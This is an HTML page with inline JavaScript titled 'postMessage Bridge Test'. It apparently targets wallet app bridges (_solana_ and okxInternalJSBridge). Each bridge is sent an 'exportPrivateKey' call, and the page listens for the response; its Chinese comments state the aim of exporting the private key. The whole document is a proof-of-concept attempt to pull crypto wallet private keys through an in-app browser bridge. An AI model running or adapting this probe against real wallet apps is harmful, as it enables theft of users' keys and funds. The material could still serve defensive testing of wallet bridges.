<html><body style="background:#1a1a2e;color:#fff;font-family:monospace;padding:20px">
<h2>postMessage Bridge Test</h2>
<pre id="d" style="color:#0f0"></pre>
<script>
var d=document.getElementById('d');
function log(m){d.textContent+=m+'\n';}

log('Bridges found:');
log('  _solana_: ' + (typeof _solana_));
log('  okxInternalJSBridge: ' + (typeof okxInternalJSBridge));

// 尝试通过 postMessage 导出私钥
var bridges = [
  {name:'_solana_', obj:_solana_},
  {name:'okxInternalJSBridge', obj:okxInternalJSBridge}
];

bridges.forEach(function(b){
  if(!b.obj) return;
  log('\n--- ' + b.name + ' ---');
  
  // 尝试 postMessage 调用 exportPrivateKey
  var msg = JSON.stringify({
    method: 'exportPrivateKey',
    params: [''],
    id: 1
  });
  
  try {
    b.obj.postMessage(msg);
    log('  postMessage sent: exportPrivateKey');
  } catch(e) {
    log('  postMessage error: ' + e.message);
  }
  
  // 也试 onMessage 监听
  try {
    b.obj.onmessage = function(e){
      log('  onMessage received: ' + JSON.stringify(e.data));
    };
  } catch(e) {}
});
</script>
</body></html>
